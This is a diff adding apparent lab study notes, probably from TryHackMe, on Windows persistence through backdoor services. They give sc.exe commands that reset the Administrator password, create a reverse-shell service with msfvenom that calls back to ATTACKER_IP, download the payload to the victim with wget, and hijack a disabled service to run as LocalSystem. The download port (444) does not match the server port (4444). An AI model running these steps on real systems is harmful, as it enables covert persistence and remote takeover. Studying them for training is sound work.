@@ -1,0 +1,36 @@
+- services are executable that runs in background.
+- Creating backdoor services: 
+    - to create a new service : 
+        sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+        sc.exe start THMservice
+        - There must be a space after each equal sign
+    - to create a backdoor service : 
+        - create a payload with msfvenom : 
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+        - upload the payload to the victim
+            - attacker : 
+                python -m http.server 4444
+            - victim : 
+                wget http://ATTACKER_IP:444/rev-svc.exe -outfile "rev-svc"
+        - create a new service : 
+            - sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+            - sc.exe start THMservice2
+
+- Modifying existing services:
+    - get all services : 
+        sc.exe query state=all
+    - Any disabled service will be a good candidate, as these could be altered without user noticing it.
+    - Get the desired service :
+        sc.exe qc THMService3
+    - three things are needed to care about when using " 
+        - BINARY_PATH_NAME : should point to the payload
+        - START_TYPE : should be automatic so that it runs without user interaction
+        - SERVICE_START_NAME : should be LocalSystem to gain SYSTEM privileges.
+    - configure the service : 
+        sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+    - query it again to check if all went as expected : 
+        sc.exe qc THMService3
+    - run listner on the attacker
+        - multi handler for a metasploit payload
+    - start the service 
+        sc.exe start THMService3
